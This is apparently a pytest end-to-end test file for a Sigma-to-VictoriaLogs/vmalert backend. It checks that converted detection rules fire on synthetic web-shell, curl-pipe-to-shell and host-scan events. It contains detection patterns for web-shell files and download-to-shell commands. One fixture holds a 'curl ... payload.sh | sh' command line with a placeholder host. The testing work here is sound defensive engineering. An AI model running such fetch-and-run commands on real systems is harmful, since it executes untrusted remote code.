"""End-to-end vmalert harness.

Proves the ``vmalert`` output format end-to-end: a Sigma rule converted by
``sigma convert -t victorialogs -f vmalert`` is loaded by vmalert, evaluated
against fresh events ingested into VictoriaLogs, and fires (or correctly
does not fire) an alert with the expected annotations.

Architecture
------------

* The compose stack runs VL + vmalert under the ``vmalert`` profile
  (Vector is not started — synthetic events are emitted directly in
  pipeline-target shape and POSTed to VL via ``/insert/jsonline``).
* The harness writes a single rule-group YAML to
  ``e2e/vmalert-rules/sigma.yaml`` containing every rule under test.
* vmalert auto-prepends ``_time:[-<group_interval>]`` to each LogsQL
  expression. The group ``interval`` is ``5m`` (set by the backend), so
  ingested events must carry ``_time`` within the last 5 minutes — the
  per-test event factories build ``_time`` from ``datetime.now(UTC)``
  rather than the deterministic ``dev.synth`` baseline.
* After dropping the YAML, the harness POSTs to vmalert's ``/-/reload``
  endpoint so the new rules pick up without a full container restart.

Selection: 4 cases — 3 positive (one webserver/caddy rule, one journald
rule, one stats/correlation rule) + 1 negative (a journald rule that
must NOT fire on caddy data).
"""

from __future__ import annotations

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import pytest
import yaml
from sigma.collection import SigmaCollection

from sigma.backends.victorialogs import VictoriaLogsBackend
from sigma.pipelines.victorialogs import (
    victorialogs_caddy,
    victorialogs_journald,
    victorialogs_pipeline,
)
from tests.e2e._runtime import wait_until_healthy

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
RULES_HOST_DIR = REPO_ROOT / "e2e" / "vmalert-rules"
RULES_FILE = RULES_HOST_DIR / "sigma.yaml"

# Group ``interval`` overrides the backend's 5m default so the e2e harness
# evaluates fast and the lookback window stays bounded. vmalert prepends
# ``_time:[-<interval>]``, so this is also the visible-event horizon.
GROUP_INTERVAL = "30s"

# Worst-case ingest -> alert latency = group interval + a 5s buffer for
# vmalert internal scheduling. Poll budget is 90s so a slow CI agent
# doesn't flake.
ALERT_TIMEOUT = 90.0
ALERT_POLL_INTERVAL = 1.0

pytestmark = pytest.mark.vmalert


# ---------------------------- inline Sigma rules ----------------------------


CADDY_RULE_YAML = """
title: Caddy synth web shell access
id: 11111111-1111-4111-8111-111111111111
status: experimental
description: Synthetic test — flags requests for known web-shell file names.
author: pySigma-backend-victorialogs e2e harness
references:
  - https://attack.mitre.org/techniques/T1505/003/
tags:
  - attack.persistence
  - attack.t1505.003
logsource:
  category: webserver
detection:
  selection:
    cs-uri|contains:
      - '/shell.php'
      - '/c99.php'
  condition: selection
level: high
"""

# Detects /bin/sh|/bin/bash piping a download into shell — the curl/wget
# live-off-the-land shape the synthetic journald generator emits.
JOURNALD_RULE_YAML = """
title: Linux synth curl pipe to shell
id: 22222222-2222-4222-8222-222222222222
status: experimental
description: Synthetic test — flags `curl | sh` / `wget | bash` patterns.
author: pySigma-backend-victorialogs e2e harness
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  product: linux
detection:
  selection:
    CommandLine|contains:
      - 'curl -fsSL'
      - 'wget -qO-'
  filter:
    CommandLine|contains: '| sh'
  condition: selection or (selection and filter)
level: high
"""

# Stats / correlation: > 5 distinct destinations in 5 minutes from a
# single source — a classic horizontal-scan shape. Sigma's correlation
# (event_count) format generates a query that already contains `| stats`,
# so the vmalert backend leaves it un-wrapped.
STATS_CORRELATION_YAML = """
title: Suricata synth host scan
id: 33333333-3333-4333-8333-333333333333
status: experimental
description: Synthetic test — alerts when a single src_ip hits >= 5 dest_ip values.
correlation:
  type: event_count
  rules: scan_base
  group-by:
    - src_ip
  timespan: 5m
  condition:
    gte: 5
---
title: Suricata synth scan base
id: 33333333-3333-4333-8333-333333333334
name: scan_base
status: experimental
description: Base for the host-scan correlation.
logsource:
  category: network
  product: suricata
detection:
  selection:
    event_type: 'flow'
  condition: selection
level: low
"""


# ---------------------------- helpers --------------------------------------


def _http_get(url: str, *, timeout: float = 10.0) -> bytes:
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()


def _http_post(url: str, body: bytes, *, content_type: str, timeout: float = 30.0) -> int:
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": content_type},
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status


def _convert_vmalert(rule_yaml: str, pipeline_factory) -> str:
    """Convert one or more inline Sigma rules to a vmalert rule-group YAML."""
    backend = VictoriaLogsBackend(
        processing_pipeline=pipeline_factory() if pipeline_factory else victorialogs_pipeline()
    )
    result = backend.convert(SigmaCollection.from_yaml(rule_yaml), output_format="vmalert")
    assert isinstance(result, str), f"vmalert format must produce str, got {type(result).__name__}"
    return result


def _ingest_ndjson(vl_url: str, events: list[dict[str, Any]], *, stream_field: str) -> None:
    body = "\n".join(json.dumps(ev, sort_keys=True) for ev in events).encode("utf-8")
    qs = urllib.parse.urlencode({"_stream_fields": stream_field})
    status = _http_post(
        f"{vl_url}/insert/jsonline?{qs}",
        body,
        content_type="application/stream+json",
    )
    if status >= 300:
        raise RuntimeError(f"VL ingest failed: HTTP {status}")


def _write_rule_group(*group_yamls: str) -> None:
    """Merge multiple converted YAMLs into one rule-group document.

    The backend's ``vmalert`` format always emits a group named
    ``"Sigma rules"`` with ``interval: 5m``. vmalert rejects duplicate
    group names per file, and a 5-minute evaluation interval is far too
    slow for an e2e poll budget. We flatten every group's ``rules`` list
    into a single short-interval group named ``"Sigma rules e2e"``.

    The shorter interval has a side-effect: vmalert auto-prepends
    ``_time:[-<group_interval>]`` to each LogsQL expression, so only
    events whose ``_time`` falls within the last ``GROUP_INTERVAL`` are
    visible to the rule. The per-test event factories stamp ``_time`` to
    ``datetime.now(UTC)`` to stay inside that window.
    """
    rules: list[dict[str, Any]] = []
    for raw in group_yamls:
        doc = yaml.safe_load(raw)
        for group in doc["groups"]:
            rules.extend(group.get("rules", []))
    document = {
        "groups": [
            {
                "name": "Sigma rules e2e",
                "type": "vlogs",
                "interval": GROUP_INTERVAL,
                "rules": rules,
            }
        ]
    }
    RULES_HOST_DIR.mkdir(parents=True, exist_ok=True)
    RULES_FILE.write_text(yaml.safe_dump(document, sort_keys=False), encoding="utf-8")


def _reload_vmalert() -> None:
    """Tell vmalert to reload its rules.

    vmalert exposes ``POST /-/reload`` for in-process reload — preferred
    over a SIGHUP because it works without a tty / process-namespace
    privileges. We hit it via the host-mapped port.
    """
    vmalert_url = os.environ.get("VMALERT_URL", "http://localhost:8880")
    req = urllib.request.Request(f"{vmalert_url}/-/reload", method="POST")
    with urllib.request.urlopen(req, timeout=10) as resp:
        if resp.status >= 300:
            raise RuntimeError(f"vmalert reload failed: HTTP {resp.status}")


def _firing_alerts(vmalert_url: str) -> list[dict[str, Any]]:
    """Snapshot the currently-firing alerts from vmalert."""
    try:
        body = _http_get(f"{vmalert_url}/api/v1/alerts")
    except (urllib.error.URLError, ConnectionError):
        return []
    data = json.loads(body)
    # vmalert v1 API: {"data": {"alerts": [...]}}.
    alerts = data.get("data", {}).get("alerts", [])
    return [a for a in alerts if a.get("state") == "firing"]


def _wait_for_alert(alert_name: str, *, timeout: float = ALERT_TIMEOUT) -> dict[str, Any] | None:
    """Poll vmalert until ``alert_name`` is firing, or return None on timeout."""
    vmalert_url = os.environ.get("VMALERT_URL", "http://localhost:8880")
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for a in _firing_alerts(vmalert_url):
            if a.get("name") == alert_name:
                return a
        time.sleep(ALERT_POLL_INTERVAL)
    return None


def _assert_no_alert(alert_name: str, *, window: float = 30.0) -> None:
    """Poll vmalert for ``window`` seconds; fail if ``alert_name`` ever fires."""
    vmalert_url = os.environ.get("VMALERT_URL", "http://localhost:8880")
    deadline = time.monotonic() + window
    while time.monotonic() < deadline:
        for a in _firing_alerts(vmalert_url):
            if a.get("name") == alert_name:
                raise AssertionError(
                    f"negative case violated: {alert_name!r} fired during "
                    f"the {window:.0f}s observation window: {a}"
                )
        time.sleep(ALERT_POLL_INTERVAL)


# ---------------------------- fixtures -------------------------------------


@pytest.fixture(scope="module")
def vmalert_url() -> str:
    url = os.environ.get("VMALERT_URL", "http://localhost:8880")
    try:
        wait_until_healthy(url, timeout=60.0)
    except TimeoutError as e:
        pytest.skip(f"vmalert not reachable at {url} — bring up via `make vmalert-up`. {e}")
    return url


@pytest.fixture(scope="module")
def vl_url() -> str:
    url = os.environ.get("VL_E2E_URL", "http://localhost:9428")
    try:
        wait_until_healthy(url, timeout=60.0)
    except TimeoutError as e:
        pytest.skip(f"VictoriaLogs not reachable at {url} — bring up via `make vmalert-up`. {e}")
    return url


@pytest.fixture(scope="module")
def loaded_rules(vmalert_url: str, vl_url: str) -> None:
    """Convert all inline Sigma rules and load them into vmalert."""
    caddy_yaml = _convert_vmalert(CADDY_RULE_YAML, victorialogs_caddy)
    journald_yaml = _convert_vmalert(JOURNALD_RULE_YAML, victorialogs_journald)
    stats_yaml = _convert_vmalert(STATS_CORRELATION_YAML, None)
    _write_rule_group(caddy_yaml, journald_yaml, stats_yaml)
    _reload_vmalert()
    # Give vmalert a moment to parse and start evaluating.
    time.sleep(2.0)


# ---------------------------- the four cases -------------------------------


def _caddy_shell_event(now: datetime, offset: int) -> dict[str, Any]:
    return {
        "_time": now.replace(microsecond=0).isoformat().replace("+00:00", "Z"),
        "request": {
            "method": "GET",
            "uri": "/uploads/c99.php",
            "host": "www.example.com",
            "remote_ip": "192.0.2.10",
            "headers": {"User-Agent": ["sqlmap/1-dev"]},
        },
        "status": 200,
        "size": 1024,
        "logger": "http.log.access",
        "_offset": offset,
    }


def _journald_curlsh_event(now: datetime, offset: int) -> dict[str, Any]:
    return {
        "_time": now.replace(microsecond=0).isoformat().replace("+00:00", "Z"),
        "_EXE": "/bin/sh",
        "_COMM": "sh",
        "_CMDLINE": '/bin/sh -c "curl -fsSL https://example.invalid/payload.sh | sh"',
        "_HOSTNAME": "host-01.example",
        "_PID": "12345",
        "MESSAGE": "curl pipe to shell",
        "PRIORITY": "4",
        "SYSLOG_IDENTIFIER": "sh",
        "_offset": offset,
    }


def _suricata_flow_event(now: datetime, src_ip: str, dest_ip: str, offset: int) -> dict[str, Any]:
    return {
        "_time": now.replace(microsecond=0).isoformat().replace("+00:00", "Z"),
        "event_type": "flow",
        "src_ip": src_ip,
        "src_port": 40_000 + offset,
        "dest_ip": dest_ip,
        "dest_port": 80,
        "proto": "TCP",
        "_offset": offset,
    }


def test_positive_caddy_web_shell(loaded_rules: None, vl_url: str) -> None:
    """Caddy rule fires when a request hits a known web-shell path."""
    now = datetime.now(timezone.utc)
    events = [_caddy_shell_event(now, i) for i in range(3)]
    _ingest_ndjson(vl_url, events, stream_field="logger")
    alert = _wait_for_alert("Caddy_synth_web_shell_access")
    assert alert is not None, "expected Caddy_synth_web_shell_access to fire within timeout"
    annotations = alert.get("annotations", {})
    assert annotations.get("summary") == "Caddy synth web shell access"
    labels = alert.get("labels", {})
    assert labels.get("severity") == "high"
    assert labels.get("sigma_id") == "11111111-1111-4111-8111-111111111111"


def test_positive_journald_curl_pipe_to_shell(
    loaded_rules: None,
    vl_url: str,
) -> None:
    """Linux rule fires on `curl -fsSL | sh` patterns."""
    now = datetime.now(timezone.utc)
    events = [_journald_curlsh_event(now, i) for i in range(3)]
    _ingest_ndjson(vl_url, events, stream_field="SYSLOG_IDENTIFIER")
    alert = _wait_for_alert("Linux_synth_curl_pipe_to_shell")
    assert alert is not None, "expected Linux_synth_curl_pipe_to_shell to fire within timeout"
    assert alert.get("labels", {}).get("severity") == "high"


def test_positive_suricata_host_scan_correlation(
    loaded_rules: None,
    vl_url: str,
) -> None:
    """Stats / correlation rule fires when one src hits >= 5 distinct dests."""
    now = datetime.now(timezone.utc)
    src = "192.0.2.99"
    events = [_suricata_flow_event(now, src, f"203.0.113.{i + 1}", i) for i in range(8)]
    _ingest_ndjson(vl_url, events, stream_field="event_type")
    alert = _wait_for_alert("Suricata_synth_host_scan")
    assert alert is not None, "expected Suricata_synth_host_scan to fire within timeout"


# A dedicated rule loaded only on this test's behalf — fires when an event
# with a CommandLine field contains an unmistakable marker not produced
# anywhere else in this suite. Used as the negative sanity check: ingest
# only Caddy events (which have no CommandLine), then assert this alert
# does NOT fire within the observation window.
NEGATIVE_RULE_YAML = """
title: Negative sentinel — should not fire on caddy
id: 44444444-4444-4444-8444-444444444444
status: experimental
description: Sentinel rule for the vmalert e2e negative case.
logsource:
  product: linux
detection:
  selection:
    CommandLine|contains: 'NEGATIVE_SENTINEL_DEADBEEF'
  condition: selection
level: low
"""


def test_negative_journald_rule_does_not_fire_on_caddy_data(
    loaded_rules: None,
    vl_url: str,
) -> None:
    """A Linux CommandLine rule must not fire when only Caddy events arrive.

    The sentinel rule looks for ``CommandLine`` containing a string that
    no other test or generator emits. Caddy events carry no ``CommandLine``
    at all, so the rule's selector cannot match — within the 30s
    observation window the alert must stay quiet.
    """
    sentinel_yaml = _convert_vmalert(NEGATIVE_RULE_YAML, victorialogs_journald)
    # Append the sentinel rule into the existing flat group rather than
    # adding a new group (vmalert rejects duplicate group names).
    existing = yaml.safe_load(RULES_FILE.read_text())
    sentinel_doc = yaml.safe_load(sentinel_yaml)
    new_rules: list[dict[str, Any]] = []
    for g in sentinel_doc["groups"]:
        new_rules.extend(g.get("rules", []))
    existing["groups"][0]["rules"].extend(new_rules)
    RULES_FILE.write_text(yaml.safe_dump(existing, sort_keys=False), encoding="utf-8")
    _reload_vmalert()
    time.sleep(2.0)

    now = datetime.now(timezone.utc)
    events = [_caddy_shell_event(now, 1000 + i) for i in range(3)]
    _ingest_ndjson(vl_url, events, stream_field="logger")

    _assert_no_alert("Negative_sentinel_should_not_fire_on_caddy", window=30.0)
